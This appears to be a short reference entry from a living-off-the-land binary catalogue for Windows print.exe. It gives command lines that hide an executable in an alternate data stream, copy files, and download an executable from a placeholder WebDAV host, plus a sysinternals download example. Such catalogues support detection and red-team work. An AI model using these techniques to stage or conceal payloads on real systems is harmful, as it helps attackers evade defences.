## Print.exe

* Functions: Download, Copy, Add ADS

```
print /D:c:\ads\file.txt:file.exe c:\ads\file.exe     
     
print /D:C:\ads\CopyOfFile.exe C:\ads\FileToCopy.exe

print /D:c:\outfolder\outfile.exe \\webdavserver\folder\file.exe     
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe

Code sample:
*

Resources:
* https://twitter.com/Oddvarmoe/status/985518877076541440
* https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410

Full path:
```
c:\windows\system32\print.exe
c:\windows\sysWOW64\print.exe
```

Notes:
Please note for example three: The oufolder needs to exist and the outfile.exe can't exist. Additionally webclient needs to be running
```
(from an administrator prompt)
net start webclient && print /D:c:\outfolder\outfile.exe \\live.sysinternals.com\tools\adexplorer.exe && net stop webclient
```


 
